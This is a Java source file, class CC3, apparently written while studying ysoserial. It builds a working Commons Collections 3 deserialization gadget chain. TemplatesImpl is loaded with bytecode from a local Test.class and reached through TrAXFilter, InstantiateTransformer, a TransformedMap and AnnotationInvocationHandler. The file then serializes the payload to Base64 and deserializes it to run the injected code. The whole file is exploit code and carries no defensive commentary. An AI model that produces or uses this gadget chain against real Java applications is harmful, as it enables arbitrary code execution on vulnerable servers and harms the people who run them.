package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args)throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();
        SetFieldValue(templatesimpl,"_name","aaa");
        byte[] code= Files.readAllBytes(Paths.get("C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class"));
        byte[][] codes=new byte[][]{code};
        SetFieldValue(templatesimpl,"_bytecodes",codes);
        SetFieldValue(templatesimpl,"_tfactory",new TransformerFactoryImpl());
        SetFieldValue(templatesimpl,"_transletIndex",1);
//        templatesimpl.newTransformer();
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});
//        instantiateTransformer.transform(TrAXFilter.class);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map=new HashMap<> ();
        map.put("value", "fru1ts");
        Map<Object,Object> transformedMap= TransformedMap.decorate(map, null, chainedTransformer);

        Class c= Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object object= constructor.newInstance(Retention.class,transformedMap);
        serializeBase(object);
        deserialize(serializeBase(object));

    }

    public static void SetFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }
    public static String serializeBase(Object obj) throws Exception{
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
    public static Object deserialize(String ser) throws Exception {
        byte[] base64decodeBytes= Base64.getDecoder().decode(ser);
        ByteArrayInputStream data=new ByteArrayInputStream(base64decodeBytes);
        ObjectInputStream ois=new ObjectInputStream(data);
        Object obj= ois.readObject();
        return obj;
    }
}
